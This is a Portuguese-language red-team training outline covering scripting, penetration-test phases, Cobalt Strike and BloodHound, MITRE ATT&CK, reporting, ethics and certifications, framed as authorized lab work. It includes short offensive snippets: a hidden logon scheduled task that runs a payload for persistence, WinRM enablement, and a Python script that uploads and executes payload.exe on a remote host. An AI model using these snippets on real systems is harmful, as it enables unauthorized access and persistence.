- **Python:** linguagem versátil, fácil de aprender e amplamente usada para automação, análise de dados e desenvolvimento de ferramentas ofensivas  
- **PowerShell:** shell e linguagem de script poderosa para administração e automação em ambientes Windows, essencial para manipular sistemas-alvo  

---

## 🧱 Conceitos básicos em Python

```

- Variáveis e tipos de dados (string, int, lista, dicionário)  
- Estruturas de controle (if, for, while)  
- Funções e módulos  
- Manipulação de arquivos e entrada/saída  
- Bibliotecas úteis: `os`, `sys`, `subprocess`, `requests`  

---

## 🧱 Conceitos básicos em PowerShell

```

- Cmdlets e sintaxe básica  
- Variáveis e tipos de dados  
- Condicionais e loops  
- Funções e scripts  
- Manipulação de arquivos, serviços e processos  

---

## 🔍 Exemplos simples

```

### Python: listar arquivos em um diretório

```python
import os

for arquivo in os.listdir('.'):
    print(arquivo)
```

### PowerShell: listar processos ativos

```powershell
Get-Process | Select-Object -Property Id, ProcessName
```

---

## ⚙️ Dicas para Red Team N2

```

- Pratique criando scripts para automatizar tarefas diárias (ex: coleta de informações, varredura)  
- Use scripts para integração com APIs e ferramentas de segurança  
- Teste scripts em ambientes controlados antes de usar em operações reais  
- Documente scripts e mantenha versão controlada  

---

## ✅ Conclusão

Aprender programação básica em Python e PowerShell capacita o Red Team N2 a desenvolver automações eficientes, facilitando ataques sofisticados e otimizando o tempo durante as operações.

---

# 🔴 Red Team N2: Scripts para Coleta de Informações, Exploração e Pós-Exploração

Automatizar tarefas com scripts é essencial para agilizar operações de Red Team, desde a coleta inicial até a exploração e manutenção do acesso em sistemas-alvo.

---

## 🧠 Por que usar scripts?

```

- Aumentam a eficiência e rapidez das etapas de ataque  
- Reduzem erros humanos em tarefas repetitivas  
- Permitem customização para diferentes ambientes e alvos  
- Facilitam integração com outras ferramentas e frameworks  

---

## 🧱 Fases e exemplos de scripts

```

### 1. Coleta de Informações

- Enumerar usuários, serviços e processos  
- Obter configurações de rede e sistema  
- Identificar vulnerabilidades básicas  

### Exemplo PowerShell: listar usuários locais

```powershell
Get-LocalUser | Select-Object Name, Enabled
```

### Exemplo Python: coletar informações de rede

```python
import socket

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
print(f"Hostname: {hostname}, IP: {ip}")
```

---

### 2. Exploração

- Executar payloads e exploits automatizados  
- Realizar ataques de força bruta ou injeção  
- Manipular serviços para obter acesso  

### Exemplo PowerShell: habilitar WinRM para acesso remoto

```powershell
Enable-PSRemoting -Force
```

---

### 3. Pós-Exploração

- Criar persistência (tarefas agendadas, serviços)  
- Coletar credenciais e informações sensíveis  
- Movimentação lateral e escalonamento de privilégios  

### Exemplo PowerShell: criar tarefa agendada para persistência

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File C:\Scripts\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistenciaPayload" -Description "Persistência para Red Team"
```

---

## ⚙️ Dicas para Red Team N2

```

- Teste scripts em ambientes isolados antes de usar em produção  
- Documente cada script, função e parâmetro para facilitar manutenção  
- Customize scripts para os alvos e cenários específicos  
- Combine scripts com outras técnicas para aumentar o sucesso das operações  

---

## ✅ Conclusão

Dominar scripts para coleta, exploração e pós-exploração é fundamental para o Red Team N2 operar com agilidade e precisão, potencializando o impacto das campanhas ofensivas.

---

# 🔴 Red Team N2: Prática – Criar Scripts para Facilitar Ataques e Movimentação Lateral

Automatizar tarefas ofensivas com scripts é essencial para agilizar ataques e ampliar o alcance dentro da rede alvo, facilitando a movimentação lateral e a manutenção do acesso.

---

## 🧠 Objetivos da prática

- Desenvolver scripts para automatizar a execução de ataques comuns  
- Facilitar a coleta de informações durante movimentação lateral  
- Criar persistência e escalonamento de privilégios automatizados  
- Melhorar eficiência e furtividade das operações  

---

## 🧱 Pré-requisitos

```

- Conhecimentos básicos em Python e PowerShell  
- Ambiente de laboratório isolado com máquinas Windows/Linux  
- Ferramentas de ataque disponíveis para integração (ex: Metasploit, PsExec)  

---

## 🔍 Exemplos de scripts para prática

```

### 1. Script PowerShell para listar máquinas na rede e verificar portas abertas

```powershell
$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
foreach ($comp in $computers) {
    Write-Host "Verificando $comp..."
    Test-NetConnection -ComputerName $comp -Port 445 -InformationLevel Quiet
}
```

### 2. Script Python para copiar arquivos remotamente e executar comandos

```python
import paramiko

hostname = '192.168.1.100'
username = 'user'
password = 'pass'

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname, username=username, password=password)

sftp = ssh.open_sftp()
sftp.put('payload.exe', 'C:\\Windows\\Temp\\payload.exe')
sftp.close()

stdin, stdout, stderr = ssh.exec_command('C:\\Windows\\Temp\\payload.exe')
print(stdout.read().decode())

ssh.close()
```

---

## ⚙️ Dicas para Red Team N2

```

- Teste scripts em ambientes controlados antes de usar em operações reais  
- Mantenha scripts modulares para facilitar ajustes e reutilização  
- Adicione logging para acompanhar execuções e erros  
- Integre scripts com ferramentas e frameworks para operações coordenadas  

---

## ✅ Benefícios da prática

- Acelera execução de ataques e movimentação lateral  
- Reduz esforço manual e erros durante campanhas complexas  
- Permite ataques mais furtivos e adaptados ao ambiente alvo  
- Facilita documentação e replicação das técnicas usadas  

---

## ✅ Conclusão

Criar scripts para facilitar ataques e movimentação lateral é uma habilidade essencial para o Red Team N2, aumentando a eficácia e agilidade das operações ofensivas.

---

# 🔴 Red Team N2: Planejamento e Execução de Testes de Penetração Completos

Realizar testes de penetração completos exige planejamento detalhado e execução disciplinada para identificar vulnerabilidades, explorar falhas e gerar recomendações eficazes.

---

## 🧠 Por que planejar antes de executar?

```

- Define escopo e objetivos claros para o teste  
- Garante conformidade legal e alinhamento com stakeholders  
- Otimiza uso de recursos e tempo durante o teste  
- Melhora qualidade dos resultados e documentação  

---

## 🧱 Etapas do planejamento

```

1. **Definição do escopo**: sistemas, redes, aplicações e limites  
2. **Coleta de informações preliminar**: dados públicos, arquitetura, políticas  
3. **Avaliação de riscos e autorizações**: garantir legalidade e segurança  
4. **Seleção de ferramentas e técnicas**: baseadas no escopo e objetivos  
5. **Cronograma e divisão de tarefas**: organizar a equipe e fases do teste  

---

## 🧱 Execução do teste

```

1. **Reconhecimento:** coleta ativa e passiva de informações  
2. **Enumeração:** identificação de serviços, usuários e recursos  
3. **Exploração:** aproveitamento de vulnerabilidades encontradas  
4. **Pós-exploração:** manutenção de acesso, movimentação lateral e coleta de dados  
5. **Limpeza:** remoção de artefatos e restauração do ambiente  

---

## 🔍 Documentação e relatório

```

- Registre todas as descobertas, métodos e evidências  
- Avalie o impacto e risco de cada vulnerabilidade  
- Proponha recomendações práticas e priorizadas  
- Entregue relatório claro para times técnicos e executivos  

---

## ⚙️ Dicas para Red Team N2

```

- Mantenha comunicação constante com stakeholders  
- Use ambientes controlados para evitar impactos negativos  
- Teste técnicas e ferramentas antes da execução oficial  
- Aprenda com cada teste para aprimorar processos futuros  

---

## ✅ Conclusão

Planejar e executar testes de penetração completos é fundamental para o Red Team N2 identificar riscos reais e contribuir para a segurança da organização de forma profissional e efetiva.

---

# 🔴 Red Team N2: Técnicas de Ataque Multi-Fase e Simulações de Ameaças Avançadas (APT)

Para atuar em um nível avançado, o Red Team N2 deve dominar técnicas de ataque multi-fase, simulando ameaças persistentes avançadas (APT) que replicam ataques reais e sofisticados contra organizações.

---

## 🧠 O que são ataques multi-fase e APT?

```

- **Ataque multi-fase:** sequência coordenada de ações ofensivas que evoluem para alcançar objetivos complexos  
- **APT (Advanced Persistent Threat):** ameaça sofisticada e contínua, geralmente patrocinada por grupos com recursos e motivação elevados  

---

## 🧱 Fases típicas de um ataque APT

```

1. **Reconhecimento:** coleta detalhada de informações sobre o alvo  
2. **Intrusão inicial:** exploração de vulnerabilidades para ganho de acesso inicial  
3. **Estabelecimento de persistência:** criação de backdoors e métodos para manter acesso  
4. **Movimentação lateral:** exploração da rede para ampliar controle  
5. **Coleta de dados e exfiltração:** obtenção e saída de informações sensíveis  
6. **Evasão e ocultação:** uso de técnicas para evitar detecção durante todo o processo  

---

## 🧱 Técnicas avançadas usadas

```

- Uso de phishing direcionado (spear phishing) com payloads customizados  
- Exploração zero-day e vulnerabilidades desconhecidas  
- Obfuscação e criptografia para evasão de defesas  
- Uso de canais de comunicação cifrados e disfarçados  
- Manipulação de ferramentas legítimas (Living off the Land) para ataques furtivos  

---

## 🔍 Como simular ataques APT no Red Team

```

- Planejar múltiplas fases alinhadas com objetivos reais da organização  
- Utilizar ferramentas sofisticadas como Cobalt Strike e PowerShell Empire  
- Combinar técnicas manuais com automatizadas para maior eficácia  
- Testar capacidades de detecção e resposta do Blue Team em ambientes controlados  

---

## ⚙️ Dicas para Red Team N2

```

- Estude casos reais de APT para entender táticas, técnicas e procedimentos (TTPs)  
- Mantenha-se atualizado com as últimas vulnerabilidades e exploits  
- Desenvolva e pratique em laboratórios avançados com múltiplos cenários  
- Documente detalhadamente cada fase e resultado para análise pós-ação  

---

## ✅ Conclusão

Dominar técnicas de ataque multi-fase e simular ameaças APT é essencial para o Red Team N2 realizar avaliações de segurança profundas, preparando organizações para enfrentar adversários reais e sofisticados.

---

# 🔴 Red Team N2: Ferramentas Avançadas – Cobalt Strike e BloodHound

Para realizar ataques sofisticados e mapeamento detalhado de redes, o Red Team N2 deve dominar ferramentas avançadas como Cobalt Strike e BloodHound, que são padrão da indústria em operações ofensivas.

---

## 🧠 Por que usar essas ferramentas?

```

- **Cobalt Strike:** plataforma robusta para pós-exploração, comando e controle, e execução de payloads altamente customizáveis  
- **BloodHound:** ferramenta para mapeamento e análise de relações e permissões em ambientes Active Directory, facilitando movimentação lateral  

---

## 🧱 Cobalt Strike – principais funcionalidades

```

- Implantação de beacons para comunicação furtiva  
- Execução de comandos remotos e scripts pós-exploração  
- Suporte a técnicas avançadas de evasão e persistência  
- Integração com exploits e ferramentas externas  
- Interface gráfica amigável para controle em tempo real  

🔗 [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)

---

## 🧱 BloodHound – principais funcionalidades

```

- Mapeamento das relações entre usuários, computadores, grupos e permissões no AD  
- Visualização gráfica para identificar caminhos de escalonamento e movimentação lateral  
- Suporte a queries customizadas para investigação detalhada  
- Uso de dados coletados por agentes ou scripts em PowerShell  

🔗 [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)

---

## 🔍 Como usar em conjunto

```

- Use BloodHound para planejar rotas de movimentação lateral e escalonamento de privilégios  
- Implante Cobalt Strike para executar e manter o controle sobre os hosts-alvo  
- Combine dados do BloodHound para priorizar ataques e evitar detecção  
- Execute campanhas coordenadas para simular ataques reais e sofisticados  

---

## ⚙️ Dicas para Red Team N2

```

- Pratique em ambientes de laboratório com Active Directory realista  
- Aprenda a interpretar gráficos e dados do BloodHound para tomada de decisão  
- Explore scripts e módulos do Cobalt Strike para customizar ataques  
- Atualize-se com as últimas versões e técnicas para essas ferramentas  

---

## ✅ Conclusão

Dominar Cobalt Strike e BloodHound capacita o Red Team N2 a realizar ataques precisos, furtivos e eficazes, ampliando significativamente o impacto das operações ofensivas.

---

# 🔴 Red Team N2: Prática – Conduzir um Pentest Simulado Completo

Realizar um pentest simulado completo é uma excelente forma de aplicar conhecimentos, testar ferramentas e processos, e aprimorar habilidades práticas em um ambiente controlado.

---

## 🧠 Objetivos da prática

- Executar todas as fases de um teste de penetração realista  
- Identificar vulnerabilidades e explorar falhas de segurança  
- Documentar descobertas e gerar relatório técnico e executivo  
- Desenvolver comunicação e planejamento durante o processo  

---

## 🧱 Pré-requisitos

```

- Ambiente de laboratório configurado (redes, servidores, máquinas alvo)  
- Ferramentas básicas e avançadas de pentest instaladas  
- Permissão formal para realizar o teste  
- Conhecimento em metodologias de pentest (ex: PTES, OWASP)  

---

## 🔍 Passo a passo sugerido

```

1. **Planejamento e escopo:** defina objetivos, limites e regras de engajamento  
2. **Reconhecimento:** colete informações públicas e passivas sobre o alvo  
3. **Enumeração:** identifique serviços, portas abertas e usuários  
4. **Exploração:** execute ataques e explore vulnerabilidades encontradas  
5. **Pós-exploração:** obtenha persistência, movimente-se lateralmente e colete dados  
6. **Limpeza:** remova artefatos e restaure o ambiente  
7. **Documentação:** registre todas as ações, evidências e recomendações  
8. **Relatório:** prepare e apresente um relatório claro para stakeholders técnicos e executivos  

---

## ⚙️ Dicas para Red Team N2

```

- Mantenha comunicação constante com o time e stakeholders durante o teste  
- Use ferramentas de automação para acelerar etapas repetitivas  
- Documente minuciosamente cada fase para facilitar o relatório final  
- Pratique a ética e respeite as regras definidas no escopo  

---

## ✅ Benefícios da prática

- Consolida conhecimentos teóricos e práticos  
- Melhora a confiança e capacidade de execução em situações reais  
- Ajuda a identificar gaps pessoais e de processo para evolução contínua  
- Fortalece a habilidade de produzir documentação profissional  

---

## ✅ Conclusão

Conduzir um pentest simulado completo prepara o Red Team N2 para atuar com eficiência, profissionalismo e responsabilidade em avaliações reais, promovendo a segurança da organização.

---

# 🔴 Red Team N2: Como Documentar Ataques e Vulnerabilidades

Documentar ataques e vulnerabilidades é uma etapa fundamental para garantir que os resultados do Red Team sejam compreendidos, replicáveis e utilizados para fortalecer a segurança da organização.

---

## 🧠 Por que documentar?

```

- Facilita o entendimento das falhas exploradas  
- Permite replicação e correção eficiente das vulnerabilidades  
- Suporta comunicação clara com equipes técnicas e executivas  
- Serve como base para relatórios, auditorias e treinamentos  

---

## 🧱 O que incluir na documentação

```

- **Contexto do ataque:** objetivo, escopo, ambiente  
- **Descrição da vulnerabilidade:** tipo, impacto, CVE se aplicável  
- **Passo a passo do ataque:** comandos, técnicas e ferramentas usadas  
- **Evidências:** capturas de tela, logs, outputs relevantes  
- **Riscos e impacto:** consequências possíveis para a organização  
- **Recomendações:** medidas corretivas e preventivas  

---

## 🔍 Estrutura recomendada para relatórios

```

1. **Resumo Executivo:** visão geral simples para gestores  
2. **Introdução:** contexto, objetivos e escopo do teste  
3. **Metodologia:** técnicas e ferramentas usadas  
4. **Descobertas:** detalhamento das vulnerabilidades exploradas  
5. **Análise de Risco:** classificação e impacto das falhas  
6. **Recomendações:** sugestões para mitigação  
7. **Conclusão:** resumo final e próximos passos  

---

## ⚙️ Boas práticas

```

- Seja claro e objetivo, evitando jargões excessivos  
- Use linguagem técnica para o time de segurança e mais simples para executivos  
- Documente imediatamente após cada fase do ataque para evitar perdas  
- Inclua evidências visuais sempre que possível  
- Revise e valide a documentação antes da entrega  

---

## ✅ Conclusão

Uma documentação bem feita é crucial para que as vulnerabilidades identificadas sejam compreendidas, tratadas e usadas para melhorar a postura de segurança da organização.

---

# 🔴 Red Team N2: Produzir Relatórios Claros, Técnicos e Executivos

A habilidade de produzir relatórios claros e bem estruturados é essencial para o Red Team N2, garantindo que os resultados do pentest sejam compreendidos por todos os públicos, desde técnicos até executivos.

---

## 🧠 Por que adaptar relatórios para públicos diferentes?

```

- Facilita a comunicação eficaz entre times técnicos e gestores  
- Garante que decisões sejam tomadas com base em informações claras  
- Evita mal-entendidos e interpretações erradas dos resultados  
- Promove maior engajamento e apoio para ações corretivas  

---

## 🧱 Tipos de relatórios e seus focos

```

### 1. Relatório Técnico

- Detalha vulnerabilidades, técnicas usadas, evidências e comandos  
- Público: analistas de segurança, desenvolvedores e técnicos  
- Linguagem: técnica e detalhada  
- Inclui: logs, screenshots, código, detalhes de exploração  

### 2. Relatório Executivo

- Apresenta visão geral, riscos, impacto e recomendações  
- Público: gestores, diretores e decisores  
- Linguagem: clara, objetiva e livre de jargões técnicos  
- Inclui: resumo do teste, principais descobertas, impacto nos negócios e sugestões de mitigação  

---

## 🔍 Estrutura recomendada para relatórios

```

1. **Resumo Executivo (para relatório executivo)**  
2. **Introdução e Escopo**  
3. **Metodologia**  
4. **Descobertas Técnicas (detalhadas no relatório técnico)**  
5. **Análise de Riscos**  
6. **Recomendações**  
7. **Conclusão e Próximos Passos**  
8. **Apêndices (logs, scripts, evidências)**  

---

## ⚙️ Boas práticas para redação

```

- Use linguagem simples e objetiva no relatório executivo  
- Seja detalhado e preciso no relatório técnico  
- Utilize gráficos e tabelas para facilitar compreensão  
- Destaque as vulnerabilidades críticas e seus impactos  
- Revise cuidadosamente para evitar erros e ambiguidades  
- Mantenha confidencialidade e segurança das informações  

---

## ✅ Conclusão

Produzir relatórios claros e adaptados aos diferentes públicos é uma competência essencial para o Red Team N2, que impacta diretamente na eficácia da comunicação e na resposta às vulnerabilidades identificadas.

---

# 🔴 Red Team N2: Preparação para Apresentar Resultados para Equipes Técnicas e Executivas

Apresentar os resultados de um pentest de forma eficaz é tão importante quanto a execução do teste. Saber adaptar a comunicação para diferentes públicos potencializa o impacto das descobertas.

---

## 🧠 Por que preparar apresentações específicas?

```

- Facilita o entendimento e engajamento dos diferentes públicos  
- Evita sobrecarregar executivos com detalhes técnicos desnecessários  
- Garante que equipes técnicas recebam informações precisas e acionáveis  
- Ajuda a alinhar expectativas e planejar ações corretivas  

---

## 🧱 Diferenças na abordagem

```

### Para equipes técnicas

- Foque em detalhes técnicos, métodos usados, evidências e recomendações práticas  
- Utilize termos técnicos e exemplos reais do teste  
- Prepare-se para perguntas detalhadas e discussões técnicas  

### Para equipes executivas

- Apresente um resumo claro dos riscos, impactos e prioridades  
- Use linguagem acessível, gráficos e métricas de negócio  
- Destaque benefícios e retorno sobre investimento para correções  

---

## 🔍 Dicas para apresentação

```

- Estruture a apresentação com agenda clara e objetivos definidos  
- Use slides limpos, com textos curtos e visualizações impactantes  
- Prepare respostas para possíveis dúvidas e objeções  
- Seja objetivo e mantenha o foco nos pontos mais relevantes para cada público  
- Pratique a apresentação para ganhar confiança e fluidez  

---

## ⚙️ Ferramentas úteis

```

- PowerPoint, Google Slides para criação dos slides  
- Ferramentas de visualização de dados (Excel, Tableau, Grafana)  
- Softwares de gravação para apresentar remotamente, se necessário  

---

## ✅ Conclusão

Uma boa preparação para apresentar resultados permite que o Red Team N2 comunique suas descobertas de forma clara, influenciando positivamente as decisões e ações da organização.

---

# 🔴 Red Team N2: Prática – Elaborar Relatório e Apresentação para Stakeholders

Elaborar um relatório detalhado e uma apresentação clara para stakeholders é fundamental para garantir que os resultados do Red Team sejam compreendidos e as ações necessárias sejam implementadas.

---

## 🧠 Objetivos da prática

```

- Criar documentação técnica detalhada para equipes de segurança  
- Produzir um resumo executivo acessível para gestores e diretores  
- Desenvolver uma apresentação clara, objetiva e impactante  
- Aprender a comunicar riscos, impactos e recomendações  

---

## 🧱 Passos para elaboração do relatório

```

1. Organize as descobertas por criticidade e impacto  
2. Documente métodos, evidências e comandos usados  
3. Redija recomendações práticas e prioridades de correção  
4. Revise para clareza, precisão e profissionalismo  

---

## 🔍 Estrutura sugerida para apresentação

```

- **Introdução:** contexto e objetivos do teste  
- **Resumo Executivo:** principais descobertas e impactos  
- **Detalhes Técnicos:** vulnerabilidades, explorações e evidências  
- **Análise de Risco:** avaliação e classificação das falhas  
- **Recomendações:** ações prioritárias e mitigação  
- **Perguntas e Discussão:** abrir espaço para dúvidas  

---

## ⚙️ Dicas para a apresentação

```

- Use slides limpos, com textos curtos e gráficos explicativos  
- Adapte a linguagem conforme o público (técnico ou executivo)  
- Ensaie para garantir fluidez e domínio do conteúdo  
- Prepare-se para responder perguntas e discutir soluções  

---

## ✅ Benefícios da prática

```

- Melhora a capacidade de comunicação técnica e executiva  
- Fortalece a credibilidade do Red Team perante a organização  
- Facilita a tomada de decisão e ações corretivas rápidas  
- Desenvolve habilidades essenciais para crescimento profissional  

---

## ✅ Conclusão

Praticar a elaboração de relatórios e apresentações para stakeholders prepara o Red Team N2 para transmitir resultados de forma eficaz, aumentando o impacto e valor das avaliações de segurança.

---

# 🔴 Red Team N2: Conhecer MITRE ATT&CK para Mapear Técnicas Ofensivas

O framework MITRE ATT&CK é uma base essencial para o Red Team entender, mapear e planejar técnicas ofensivas de forma estruturada, alinhada com ameaças reais e reconhecidas mundialmente.

---

## 🧠 O que é o MITRE ATT&CK?

```

- Um banco de dados global de técnicas, táticas e procedimentos (TTPs) usados por adversários  
- Organizado em matrizes que cobrem diferentes fases do ciclo de ataque, como Reconhecimento, Execução, Persistência, etc.  
- Facilita a compreensão do comportamento do atacante e a criação de simulações realistas  

---

## 🧱 Benefícios para o Red Team

```

- Planejamento de ataques alinhados a técnicas conhecidas e atuais  
- Identificação de lacunas em defesas e detecção  
- Comunicação clara com o Blue Team usando uma linguagem padrão  
- Melhoria contínua das táticas com base em ameaças reais  

---

## 🔍 Como usar o MITRE ATT&CK na prática

```

- Estude as táticas e técnicas relevantes para seu escopo de atuação  
- Mapear ferramentas e exploits às técnicas do framework  
- Utilizar o ATT&CK Navigator para planejar campanhas e simulações  
- Documentar ataques e relatórios referenciando as técnicas usadas  

---

## ⚙️ Dicas para Red Team N2

```

- Familiarize-se com as matrizes Enterprise, Mobile e ICS conforme seu foco  
- Atualize-se com as novas técnicas e atualizações do framework  
- Combine o MITRE ATT&CK com outras fontes de inteligência de ameaças  
- Use ferramentas que suportem integração com ATT&CK para análise e visualização  

---

## ✅ Conclusão

Conhecer e aplicar o MITRE ATT&CK permite ao Red Team N2 realizar avaliações ofensivas mais realistas, efetivas e alinhadas às ameaças atuais, fortalecendo a segurança da organização.

---

# 🔴 Red Team N2: Entender Normas e Padrões Aplicáveis (NIST, ISO 27001)

Conhecer normas e padrões de segurança da informação é fundamental para o Red Team N2 alinhar suas práticas às exigências regulatórias e melhores práticas do mercado, garantindo credibilidade e conformidade.

---

## 🧠 Por que entender normas e padrões?

```

- Ajuda a identificar controles obrigatórios e recomendados  
- Facilita o alinhamento das avaliações e relatórios com requisitos legais  
- Melhora a comunicação com equipes de compliance e auditoria  
- Garante que os testes considerem políticas e procedimentos internos  

---

## 🧱 Principais normas e frameworks

```

### NIST Cybersecurity Framework (CSF)

- Estrutura orientada a gestão de riscos em segurança cibernética  
- Composto por cinco funções: Identificar, Proteger, Detectar, Responder e Recuperar  
- Usado amplamente em setores públicos e privados nos EUA e globalmente  

### ISO/IEC 27001

- Padrão internacional para sistemas de gestão de segurança da informação (SGSI)  
- Define requisitos para estabelecer, implementar, manter e melhorar a segurança da informação  
- Foca em controles, avaliação de riscos e melhoria contínua  

---

## 🔍 Como aplicar no Red Team

```

- Entenda os controles de segurança que serão avaliados durante os testes  
- Use os frameworks para planejar escopo e metodologia dos pentests  
- Prepare relatórios que considerem os requisitos das normas para facilitar correções  
- Apoie a equipe de segurança na adequação a normas e auditorias  

---

## ⚙️ Dicas para Red Team N2

```

- Estude os documentos oficiais e resumos dos frameworks para rápida referência  
- Participe de treinamentos e certificações relacionados (ex: CISSP, CISM)  
- Utilize checklists baseados em normas para guiar as avaliações  
- Mantenha-se atualizado sobre mudanças e novas versões das normas  

---

## ✅ Conclusão

Entender normas como NIST CSF e ISO 27001 é essencial para o Red Team N2 atuar com alinhamento estratégico, aumentando o valor das avaliações e contribuindo para a segurança e conformidade organizacional.

---

# 🔴 Red Team N2: Ética, Escopo e Regras de Engajamento em Testes de Invasão

Executar testes de invasão com responsabilidade exige aderência a princípios éticos, definição clara de escopo e regras de engajamento para garantir a segurança e legalidade da operação.

---

## 🧠 Por que ética e escopo são fundamentais?

```

- Protege a integridade da organização e das pessoas envolvidas  
- Garante que o teste seja legal e autorizado  
- Evita impactos indesejados e danos aos sistemas  
- Promove confiança e profissionalismo na atuação do Red Team  

---

## 🧱 Ética em testes de invasão

```

- Sempre obtenha autorização formal e documentada antes de iniciar o teste  
- Respeite a privacidade e dados sensíveis encontrados durante o trabalho  
- Informe imediatamente a equipe responsável sobre descobertas críticas que possam causar danos  
- Evite ações que possam comprometer a disponibilidade dos sistemas sem prévia concordância  

---

## 🔍 Definindo escopo e regras de engajamento

```

- **Escopo:** delimitação clara dos sistemas, redes, aplicativos e recursos que podem ser testados  
- **Regras de engajamento:** limites operacionais, horários permitidos, técnicas proibidas, comunicação e protocolos de emergência  
- **Critérios de sucesso e falha:** definição do que caracteriza vulnerabilidades e como reportá-las  
- **Equipe envolvida:** contatos, responsáveis e autoridades para decisão durante o teste  

---

## ⚙️ Boas práticas para Red Team N2

```

- Documente todo o acordo de escopo e regras antes de iniciar o trabalho  
- Comunique-se regularmente com o cliente ou equipe de segurança durante o teste  
- Tenha um plano de resposta para situações inesperadas, como falhas ou interrupções  
- Garanta a confidencialidade dos resultados e dados coletados  

---

## ✅ Conclusão

A ética, o escopo bem definido e regras claras de engajamento são pilares para que o Red Team N2 realize testes de invasão seguros, eficazes e respeitosos, mantendo a confiança e legalidade em todas as operações.

---

# 🔴 Red Team N2: Prática – Criar Planos de Ataque Alinhados a Frameworks

Desenvolver planos de ataque estruturados e alinhados a frameworks reconhecidos como MITRE ATT&CK permite ao Red Team executar operações mais eficazes, organizadas e com foco nas ameaças reais.

---

## 🧠 Objetivos da prática

```

- Planejar ataques com base em técnicas e táticas conhecidas  
- Garantir que as ações estejam alinhadas a padrões da indústria  
- Facilitar a comunicação e documentação dos ataques  
- Aprimorar a capacidade de simular cenários reais de ameaça  

---

## 🧱 Passos para criar um plano de ataque

```

1. **Definir objetivo do ataque:** escopo, metas e restrições  
2. **Selecionar framework:** MITRE ATT&CK, Cyber Kill Chain, etc.  
3. **Mapear táticas e técnicas relevantes:** escolha as que melhor se aplicam ao cenário  
4. **Detalhar métodos e ferramentas:** ferramentas, exploits e scripts a serem usados  
5. **Planejar sequência de ações:** fases do ataque organizadas cronologicamente  
6. **Estabelecer métricas de sucesso:** critérios para avaliar a eficácia do ataque  

---

## 🔍 Dicas para Red Team N2

```

- Use o MITRE ATT&CK Navigator para visualizar e organizar técnicas  
- Mantenha o plano flexível para adaptar-se a mudanças durante o teste  
- Documente cada etapa para facilitar análise e relatório posterior  
- Considere controles e defesas conhecidas para melhorar a evasão  

---

## ✅ Benefícios da prática

```

- Maior organização e clareza nas operações ofensivas  
- Simulações mais realistas e alinhadas a ameaças atuais  
- Melhora na comunicação com equipes internas e clientes  
- Facilita análise pós-teste e identificação de melhorias  

---

## ✅ Conclusão

Criar planos de ataque alinhados a frameworks é uma prática essencial para o Red Team N2, elevando a qualidade, eficiência e impacto das avaliações ofensivas.

---

# 🔴 Red Team N2: Realizar Exercício Completo de Red Team (Reconhecimento a Relatório)

Conduzir um exercício completo de Red Team é fundamental para praticar todas as fases do ciclo ofensivo, desde o reconhecimento inicial até a entrega do relatório final, aprimorando habilidades técnicas e de comunicação.

---

## 🧠 Objetivos do exercício

```

- Executar todas as etapas de um ataque simulado controlado  
- Identificar vulnerabilidades, explorar falhas e coletar evidências  
- Documentar descobertas com clareza e precisão  
- Desenvolver habilidades para apresentar resultados técnicos e executivos  

---

## 🧱 Etapas do exercício completo

```

1. **Planejamento e escopo:** definir metas, regras e limites  
2. **Reconhecimento:** coletar informações públicas e passivas do alvo  
3. **Enumeração:** identificar portas, serviços, usuários e sistemas  
4. **Exploração:** utilizar vulnerabilidades para acesso inicial  
5. **Pós-exploração:** movimentação lateral, escalonamento e coleta de dados  
6. **Limpeza:** remoção de artefatos e rastros do ataque  
7. **Documentação:** elaborar relatório técnico e executivo detalhado  
8. **Apresentação:** comunicar resultados para stakeholders  

---

## 🔍 Dicas para Red Team N2

```

- Use ferramentas automáticas e manuais para complementar o trabalho  
- Documente cada etapa em tempo real para evitar perda de informações  
- Trabalhe em equipe para simular cenários reais com múltiplas frentes  
- Prepare planos de contingência para imprevistos durante o exercício  

---

## ✅ Benefícios do exercício completo

```

- Consolida conhecimentos técnicos e estratégicos  
- Melhora a capacidade de planejamento e execução de ataques reais  
- Desenvolve habilidades de documentação e comunicação profissional  
- Ajuda a identificar pontos fortes e áreas de melhoria pessoal  

---

## ✅ Conclusão

Realizar exercícios completos de Red Team prepara o profissional para enfrentar desafios reais com confiança, técnica apurada e comunicação eficaz, entregando valor para a segurança organizacional.

---

# 🔴 Red Team N2: Planejar Próximos Passos para Especialização (ex: Certificações OSCP, CRTP)

Planejar a evolução profissional com foco em especialização ajuda o Red Team N2 a alcançar níveis mais avançados, consolidar conhecimentos e abrir portas para oportunidades de carreira.

---

## 🧠 Por que planejar a especialização?

```

- Direciona esforços para objetivos claros e alcançáveis  
- Ajuda a organizar estudos e práticas de forma eficiente  
- Valida conhecimentos técnicos com certificações reconhecidas  
- Melhora o currículo e a reputação profissional  

---

## 🧱 Certificações recomendadas para Red Team N2

```

### OSCP (Offensive Security Certified Professional)

- Foco em testes de penetração práticos e avançados  
- Reconhecida mundialmente na comunidade de segurança ofensiva  
- Requer domínio de técnicas de exploração, pós-exploração e scripting  

### CRTP (Certified Red Team Professional)

- Especialização em ataques e persistência em ambientes Windows  
- Foco em técnicas avançadas de Active Directory e movimentação lateral  
- Ideal para quem deseja atuar com Red Team mais especializado  

### Outras certificações relevantes

- CEH (Certified Ethical Hacker)  
- eCPPT (eLearnSecurity Certified Professional Penetration Tester)  
- OSWE (Offensive Security Web Expert)  

---

## 🔍 Como planejar seus estudos

```

- Avalie seu nível atual e áreas que precisam de reforço  
- Defina um cronograma realista com metas semanais e mensais  
- Combine teoria, prática em laboratórios e simulações reais  
- Utilize cursos, materiais oficiais, vídeos e comunidades técnicas  
- Faça revisões periódicas e participe de grupos de estudo  

---

## ⚙️ Dicas para Red Team N2

```

- Priorize certificações que agreguem valor ao seu objetivo profissional  
- Pratique muito em laboratórios e máquinas virtuais (ex: Hack The Box, TryHackMe)  
- Documente seu progresso e dificuldades para ajustar o plano  
- Busque feedback de mentores e colegas experientes  

---

## ✅ Conclusão

Planejar os próximos passos para especialização permite ao Red Team N2 crescer com foco, disciplina e confiança, ampliando sua atuação e relevância no mercado de segurança ofensiva.

---

